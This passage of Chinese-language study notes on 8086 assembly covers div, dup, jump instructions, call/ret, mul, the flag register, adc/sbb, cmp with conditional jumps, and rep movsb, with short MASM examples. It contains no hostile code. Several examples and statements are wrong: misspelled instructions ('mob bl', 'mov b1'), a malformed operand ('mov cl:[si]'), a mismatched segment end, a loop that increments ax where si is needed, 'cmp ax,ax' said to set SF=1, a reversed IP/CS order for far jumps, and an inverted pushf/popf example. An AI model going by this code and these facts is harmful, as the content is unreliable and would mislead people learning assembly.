[bx],2</p>\n<p>mov byte ptr ds:[0],1  // 这时 8 位的，01H</p>\n<p>double word ptr 双字</p>\n</blockquote>\n<p>3. 其他方法 push [1000H] 入栈，push 指令只对字进行操作 sp=sp-2</p>\n<p>用 bx 定位整个结构体，用 idata 定位结构体中的某一个数据项，用 si 定位数组项中的每个元素。</p>\n<p>[bx].idata</p>\n<p>[bx].idata[si]</p>\n<p>div</p>\n<p>除数 8/16 位，被除数默认放在 ax,dx 和 ax 中</p>\n<p>如果除数为 8 位，被除数需要 16 位 (ax)</p>\n<p>如果除数为 16 位，被除数需要 32 位 (ax+dx),dx 是高位，ax 是低位</p>\n<p>除数是 8 位的时候，商在 al 中，余数在 ah 中</p>\n<p>除数是 16 位的时候，商在 ax 中，余数在 dx 中</p>\n<p>div 寄存器</p>\n<p>div 内存单元</p>\n<p>div btye ptr ds:[0]   // <code>(al)=(ax)/((ds)*16+0)的商，(ah)=(ax)/((ds)*16+0)的余数</code></p>\n<p>div word ptr es:[0]  // <code>(ax)=[(dx)*10000H+(ax)]/((ds)*16+0)的商，(dx)=[(dx)*10000H+(ax)]/((ds)*16)+0的余数</code></p>\n<p>10001/100</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov dx,1</span><br><span class=\"line\">mov ax,86a1</span><br><span class=\"line\">mov bx,100</span><br><span class=\"line\">div bx</span><br></pre></td></tr></table></figure>\n<p>1001/100</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov ax,1001</span><br><span class=\"line\">mob bl,100</span><br><span class=\"line\">div bl</span><br></pre></td></tr></table></figure>\n<p>dd 定义双字</p>\n<p>用 div 计第 data 段中第一个数据除以第二个数据后的结果・商存放在第 3 个数据的存储单元。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code,ds:data</span><br><span class=\"line\">data segment</span><br><span class=\"line\">\tdd 100001</span><br><span class=\"line\">\tdw 100</span><br><span class=\"line\">\tdw 0</span><br><span class=\"line\">data ends</span><br><span class=\"line\"></span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ax,data\t</span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t\tmov ax,ds:[0]</span><br><span class=\"line\">\t\tmov dx,ds:[2]</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tdiv word ptr ds:[4]</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ds:[6],ax</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax,4c00H</span><br><span class=\"line\">\t\tint 21H</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">codesg ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>dup</p>\n<p>db 3 dup (0)   定义 3byte，他们值都是 0</p>\n<p>db 3 dup(0,1,2)  //0,1,2,0,1,2,0,1,2</p>\n<p>db 3 dup(‘abc’,‘ABC’)  //abcABCabcABCabcABC</p>\n<p>db/dw/dd n dup()</p>\n<h2 id=\"转移指令\"><a class=\"markdownIt-Anchor\" href=\"#转移指令\">#</a> 转移指令</h2>\n<p>8086 转移指令分为：</p>\n<p>8086CPU 的转移行为有以下几类。</p>\n<blockquote>\n<p>1. 无条件转移</p>\n<p>2. 条件转移指令</p>\n<p>3. 循环指令</p>\n<p>4. 过程</p>\n<p>5. 中断</p>\n</blockquote>\n<ol>\n<li></li>\n</ol>\n<p>jmp 无条件跳转</p>\n<p>只修改 IP 时，称为段内转移，比如: jmp ax。</p>\n<p>同时修改 CS 和 IP 时，称为段间转移，比如: jmp 1000:0。</p>\n<p>由于转移指令对 IP 的修改范围不同，段内转移又分为：短转移和近转移。</p>\n<p>短转移 IP 的修改范围为 - 128~127。</p>\n<p>近转移 IP 的修改范围为 - 32768~32767。</p>\n<p>操作符 offset</p>\n<p>取得标号的偏移地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">start:\tmov ax,offset start   ;mov ax,0</span><br><span class=\"line\">s:\t\tmov ax,offset s\t\t  ;mov ax,3</span><br></pre></td></tr></table></figure>\n<p>jmp 指令</p>\n<p><code>jmp short 标号</code>   ；转移到标号处执行指令是种短转移，修改 IP 范围为 - 128-127</p>\n<p>然鹅，jmp 0008 的机器码为 EB 03，0008 为需要跳转的命令地址</p>\n<p>jmp 000A   EB 05</p>\n<p>CPU 不需要目的地址就可以实现对 IP 的修改</p>\n<p>EB 后面的数字实际是个 offset，说明目的指令离 jmp 五个字节</p>\n<p><code>jmp near ptr 标号 </code>  , 用于实现段内近转移位移范围 - 32769-32767</p>\n<p><code>jmp far ptr 标号</code>      // 段间转移，远转移</p>\n<p>far ptr 指明了格用标号的段地址和偏移地址修改 CS 和 IP</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221024210038120.png\" alt=\"image-20221024210038120\"></p>\n<p>此时机器码为跳转的地址，IP 在前，CS 在后</p>\n<p><code>jmp 16位寄存器</code></p>\n<p>jmp ax     // 实现段内近 / 短转移，ax 中为 ip 的值</p>\n<p>转移地址在内存中：</p>\n<p><code>jmp word ptr 内存单元地址</code>     // 实现内存单元地址的段内转移，内存单元地址是目的地址</p>\n<p>jmp word ptr ds:[0]</p>\n<p>jmp word ptr [bx]</p>\n<p><code>jmp dword ptr 内存单元地址</code>    // 段间跳转，跳转时 IP 是高位，CS 是低位</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov ax,0123H</span><br><span class=\"line\">mov [bx],ax</span><br><span class=\"line\">mov word ptr [bx+2],0</span><br><span class=\"line\">jmp dword ptr [bx]</span><br></pre></td></tr></table></figure>\n<p>jcxz 标号；有条件跳转指令</p>\n<p>IP 修改范围 - 128-127</p>\n<p>如果 cx=0，转移到标号处</p>\n<p>cx=0 时，IP 位移</p>\n<p>cx!=0 向下执行</p>\n<p>loop 标号</p>\n<p>转移范围 - 128-127，短转移</p>\n<p>cx=0 向下执行，cx！=0 转移到标号处</p>\n<h2 id=\"call和ret\"><a class=\"markdownIt-Anchor\" href=\"#call和ret\">#</a> call 和 ret</h2>\n<p>call 和 ret 都是转移指令，他们都修改 IP，或者同时修改 CS:IP</p>\n<p>ret 用栈中数据修改 IP 实现近转移</p>\n<p>IP = SS*16 + SP</p>\n<p>SP = SP + 2</p>\n<p>pop ip</p>\n<p>retf 修改 CS:IP 实现远转移</p>\n<p>IP = SS*16 + SP</p>\n<p>SP = SP + 2</p>\n<p>CS = ss*16 + SP</p>\n<p>(SP) = (SP) + 2</p>\n<p>pop ip</p>\n<p>pop cs</p>\n<p>call</p>\n<p>将 IP 或 CSIP 入栈，转移 (jmp)</p>\n<p>call 不能实现短转移</p>\n<p>call 标号   将当前 IP 压栈，转移到标号</p>\n<p>sp = sp -2</p>\n<p>ss*16 + sp = IP</p>\n<p>IP = IP + 位移 (16 位)</p>\n<p>相当于: push ip     +  jmp near ptr 标号</p>\n<p>call 只是将当前位置保存到栈了，其余和 jmp 一样</p>\n<p>call 16 位寄存器</p>\n<p>push IP</p>\n<p>jmp bx</p>\n<p>转移地址在内存中 call</p>\n<p>call word ptr 内存地址</p>\n<p>push IP   jmp word ptr 偏移地址</p>\n<p>call dword ptr 内存地址</p>\n<p>push cs   push IP   jmp dword ptr 内存单元地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov sp,10h</span><br><span class=\"line\">mov ax,0123h</span><br><span class=\"line\">mov ds:[0],ax</span><br><span class=\"line\">mov word ptr ds:[2],0</span><br><span class=\"line\">call dword ptr ds:[0]</span><br><span class=\"line\"></span><br><span class=\"line\">---</span><br><span class=\"line\">此时ds中低位为0123(IP)，高位为0000(CS)</span><br><span class=\"line\">call结束后,cs=0,ip=0123,sp=0ch</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\">code segment</span><br><span class=\"line\">start: \tmov ax,1</span><br><span class=\"line\">\t\tmov cx,3</span><br><span class=\"line\">\t\tcall s</span><br><span class=\"line\">\t\tmov bx,ax  ;bx=8</span><br><span class=\"line\">\t\tmov ax,4c00h</span><br><span class=\"line\">\t\tint 21h</span><br><span class=\"line\">s:\t\tadd ax,ax</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\">\t\tret</span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start    ;实现2^n</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221028213345088.png\" alt=\"image-20221028213345088\"></p>\n<p>某种意义上来说，call 是调用，ret 是返回 (return)</p>\n<p>call 和 ret 要对应</p>\n<p>mul 指令</p>\n<p>相乘的两个数要么都是 8 要么都是 16</p>\n<p>8 位：AL 中或内存中</p>\n<p>16 位：AX 中或内存中</p>\n<p>结果：</p>\n<p>8 位：ax 中</p>\n<p>16 位：dx（高位），ax（低位）</p>\n<p>mul 寄存器</p>\n<p>mul 内存单元</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mul byte ptr ds:[0]</span><br><span class=\"line\">ax = al * (ds:[0])</span><br><span class=\"line\"></span><br><span class=\"line\">mul word ptr [bx+si+8]</span><br><span class=\"line\">ax=ax*([bx+si+8]) 低16位</span><br><span class=\"line\">dx=ax*([bx+si+8]) 高16位</span><br></pre></td></tr></table></figure>\n<p>100*10</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov al,100</span><br><span class=\"line\">mov b1,10</span><br><span class=\"line\">mul bl</span><br></pre></td></tr></table></figure>\n<p>即需要将任意一个乘数放在 ax 或 al 中，另一个乘数放在空闲的通用寄存器中</p>\n<p>计算 n 的三次方</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cube:\tmov ax,bx</span><br><span class=\"line\">\t\tmul bx</span><br><span class=\"line\">\t\tmul bx</span><br><span class=\"line\">\t\tret</span><br></pre></td></tr></table></figure>\n<p>dw 的三次方放入 dw 中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code,cs:data,ss:stack</span><br><span class=\"line\"></span><br><span class=\"line\">data segment</span><br><span class=\"line\">\tdw 1,2,3,4,5,6,7,8</span><br><span class=\"line\">\tdw 0,0,0,0,0,0,0,0</span><br><span class=\"line\">data ends</span><br><span class=\"line\"></span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ax,data</span><br><span class=\"line\">\t\tmov ds,ax</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov cx,8</span><br><span class=\"line\">\t\tmov si,0</span><br><span class=\"line\">s:\t\tmov bx,[si]  ;bx作为cube的参数</span><br><span class=\"line\">\t\tcall cube</span><br><span class=\"line\">\t\tmov [si+32],ax</span><br><span class=\"line\">\t\tadd ax,2</span><br><span class=\"line\">\t\tloop s</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax,4c00H</span><br><span class=\"line\">\t\tint 21H</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">cube:\tmov ax,bx\t</span><br><span class=\"line\">\t\tmul bx</span><br><span class=\"line\">\t\tmul bx</span><br><span class=\"line\">\t\tret</span><br><span class=\"line\"></span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>对于批量数据的传递，我们将它存在内存中，然后把首地址放在寄存器中</p>\n<p>判断是否以 0 结束，不是就转为大写</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">capital:mov cl:[si]</span><br><span class=\"line\">        mov ch,0</span><br><span class=\"line\">        jcxz ok</span><br><span class=\"line\">        and byte ptr[si],11011111b</span><br><span class=\"line\">        inc si</span><br><span class=\"line\">        jmp short capital</span><br></pre></td></tr></table></figure>\n<h2 id=\"标志寄存器\"><a class=\"markdownIt-Anchor\" href=\"#标志寄存器\">#</a> 标志寄存器</h2>\n<p>8086CPU 的标志客存器有 16 位，其中存储的信息通常被称为程序状态字 (PSW) 。</p>\n<p>标志寄存器结构：</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030202144281.png\" alt=\"image-20221030202144281\" style=\"zoom:67%;\" />\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030205228119.png\" alt=\"image-20221030205228119\" style=\"zoom:67%;\" />\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221030205356183.png\" alt=\"image-20221030205356183\" style=\"zoom:67%;\" />\n<p>ZF</p>\n<p>零标志位，执行指令后如果结果为 0，zf=1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov ax,1</span><br><span class=\"line\">sub ax,1 </span><br><span class=\"line\">此时ZF=1</span><br></pre></td></tr></table></figure>\n<p>运算指令，大多数会影响 ZF 寄存器</p>\n<p>PF</p>\n<p>奇偶标志位，指令执行后，如果 1 的个数为偶数，PF=1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov al,1</span><br><span class=\"line\">add al,10</span><br><span class=\"line\">;00001011   PF=0  因为3个1</span><br></pre></td></tr></table></figure>\n<p>SF</p>\n<p>符号标志位，执行指令后，结果为负，SF=1</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov al,10000001</span><br><span class=\"line\">add al,1</span><br><span class=\"line\">;可以当做无符号，130，有符号，-126</span><br></pre></td></tr></table></figure>\n<p>CF</p>\n<p>进位标志位，无符号运算标志位可能产生结果</p>\n<p>CF=NC 无进位，CF=CY 有进位，只记录上一条指令的变化</p>\n<p>not carry carry</p>\n<p>进位是更高位</p>\n<p>OF</p>\n<p>溢出标志位，有符号运算可能产生结果</p>\n<p>OF=OV 溢出  OF=NV 无溢出</p>\n<p>溢出是侵犯了符号位</p>\n<p><strong>当成有符号就看 OF 和 SF，当成无符号就看 CF</strong></p>\n<p>ADC</p>\n<p>带进位加法指令，利用了 CF 上进位值</p>\n<p>adc ax,bx   ;ax = ax + bx + cf</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov ax,2</span><br><span class=\"line\">mov bx,1</span><br><span class=\"line\">sub bx,ax</span><br><span class=\"line\">adc ax,1</span><br><span class=\"line\">;ax=4 ax+1+cf=2+1+1=4</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov al,98h</span><br><span class=\"line\">add al,al</span><br><span class=\"line\">adc al,3</span><br><span class=\"line\">;ax+3+cf = 30+3+1=34</span><br></pre></td></tr></table></figure>\n<p>加法分为两步</p>\n<p>1. 低位相加</p>\n<p>2. 高位相加，在加上低位相加产生的进位值</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">add ax,bx</span><br><span class=\"line\">===</span><br><span class=\"line\">add al,bl</span><br><span class=\"line\">adc ah,bh</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>就是那种 1EF000H+201000H</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\"></span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ax,01EFH  ;high</span><br><span class=\"line\">\t\tmov bx,0F00H  ;low </span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov cx,1000H  ;low</span><br><span class=\"line\">\t\tmov dx,0201H  ;high</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tadd bx,cx</span><br><span class=\"line\">\t\tadc ax,dx</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">cube:\tmov ax,bx\t</span><br><span class=\"line\">\t\tmul bx</span><br><span class=\"line\">\t\tmul bx</span><br><span class=\"line\">\t\tret</span><br><span class=\"line\"></span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>或者只用两个寄存器</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mov ax,001EH</span><br><span class=\"line\">mov bx,0F000H</span><br><span class=\"line\">add bx,1000H</span><br><span class=\"line\">adc ax,0020H</span><br></pre></td></tr></table></figure>\n<p>inc 和 loop 不影响 CF 的值，因此不能替换为 add ax,2</p>\n<p>sbb</p>\n<p>带进位减法指令</p>\n<p>sbb ax,bx</p>\n<p>ax = ax - bx - cf</p>\n<p>cmp</p>\n<p>功能类似于减法指令，但不保存结果，只对标志寄存器产生影响</p>\n<p>cmp ax,ax</p>\n<p>ax-ax ，不保存结果，只影响 flag，ZF=1,PF=1,SF=1,CF=0,OF=0</p>\n<p>cmp ax,bx</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031205029865.png\" alt=\"image-20221031205029865\" style=\"zoom:67%;\" />\n<p>cmp ax,ax</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031205427616.png\" alt=\"image-20221031205427616\" style=\"zoom:67%;\" />\n<p>cmp ah,bh 比较有符号数时，需要比较 SF 和 OF</p>\n<p>sf=1,of=0,ah&lt;bh</p>\n<p>SF=1,OF=1,ah&gt;bh</p>\n<p>SF=0,of=1,ah&lt;bh</p>\n<p>sf=0,of=0,ah&gt;=bh</p>\n<p>据无符号数的比较结果进行转移的条件转移指令，它们检测 ZF,CF 的值；</p>\n<p>和根据有符号数的比较结果进行转移的条件转移指令，它们检测 SF,OF ,ZF 的值・</p>\n<p>以下都是无符号指令比较时</p>\n<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221031210918994.png\" alt=\"image-20221031210918994\" style=\"zoom:67%;\" />\n<p>equal</p>\n<p>not equal</p>\n<p>below</p>\n<p>not below</p>\n<p>above</p>\n<p>not above</p>\n<p>ah=bh,ah=ah+ah,ah=ah+bh</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\"></span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov ah,45h</span><br><span class=\"line\">\t\tmov bh 48h</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tcmp ah,bh</span><br><span class=\"line\">\t\tje s</span><br><span class=\"line\">\t\tadd ah,ah</span><br><span class=\"line\">\t\tjmp short ok</span><br><span class=\"line\">s:\t\tadd ah,ah</span><br><span class=\"line\">ok: \tret</span><br><span class=\"line\"></span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>cmp 和 je 等可以单独出现</p>\n<p>data 中是否小于 8，结果保存在 ax 中</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code,ds:data</span><br><span class=\"line\"></span><br><span class=\"line\">data segment</span><br><span class=\"line\">\tdb 1,2,3,4,5,6,7,8</span><br><span class=\"line\">data ends</span><br><span class=\"line\"></span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov dx,data</span><br><span class=\"line\">\t\tmov ds,dx</span><br><span class=\"line\">\t\tmov ax,0</span><br><span class=\"line\">\t\tmov bx,0</span><br><span class=\"line\">\t\tmov cx,0</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s0:\t\tcmp byte ptr [bx],8</span><br><span class=\"line\">\t\tjnb s</span><br><span class=\"line\">\t\tinc ax</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">s:\t\tinc bx</span><br><span class=\"line\">\t\tloop s0</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov ax,4c00h</span><br><span class=\"line\">\t\tint 21h</span><br><span class=\"line\"></span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>DF</p>\n<p>方向标志位，串处理指令中，控制 si，di 增减</p>\n<p>DF=0，si,di 递增</p>\n<p>DF=1，si,di 递减</p>\n<p>movsb</p>\n<p>以字节为单位传送</p>\n<p>1. <code>es*16 + di = ds*16+di</code></p>\n<p>2. 如果 df=0，si,di++</p>\n<p>如果 df=1，si,di–</p>\n<p>movsw</p>\n<p>和 movsb 一样，但 si 和 di 是以 2 递增或递减</p>\n<p>rep movsb</p>\n<p>rep movsw</p>\n<p>根据 cx 的值，重复后面的串传送指令</p>\n<p>循环实现 cx 个字符的传送，从 ds 送到 es</p>\n<p>cld：将 DF=0</p>\n<p>std：将 DF=1</p>\n<p>将 data 段的第一个字符串送到后面的空间</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">assume cs:code</span><br><span class=\"line\"></span><br><span class=\"line\">data segment</span><br><span class=\"line\">\tdb &#x27;welcome to masm!&#x27;</span><br><span class=\"line\">\tdb 16 dup (0)</span><br><span class=\"line\">data ends</span><br><span class=\"line\"></span><br><span class=\"line\">code segment</span><br><span class=\"line\">start:\tmov dx,data</span><br><span class=\"line\">\t\tmov ds,dx</span><br><span class=\"line\">\t\tmov es,dx</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov si,0</span><br><span class=\"line\">\t\tmov di,16</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tmov cx,16</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\tcld</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\trep movsb</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tmov ax,4c00h</span><br><span class=\"line\">\t\tint 21h</span><br><span class=\"line\"></span><br><span class=\"line\">code ends</span><br><span class=\"line\">end start</span><br></pre></td></tr></table></figure>\n<p>pushf</p>\n<p>将标志寄存器压栈</p>\n<p>popf 从栈中弹出数据，送入标志寄存器</p>\n<p>比如</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">push ax</span><br><span class=\"line\">popf</span><br><span class=\"line\"></span><br><span class=\"line\">那么此时ax中就是标志寄存器中的值</span><br></pre></td></tr></table></figure>\n<p>如果学破解，到这边就可以跑路了</p>\n<hr>\n<hr>\n<hr>\n<h2 id=\"中断\"><a class=\"markdownIt-Anchor\" href=\"#中断\">#</a> 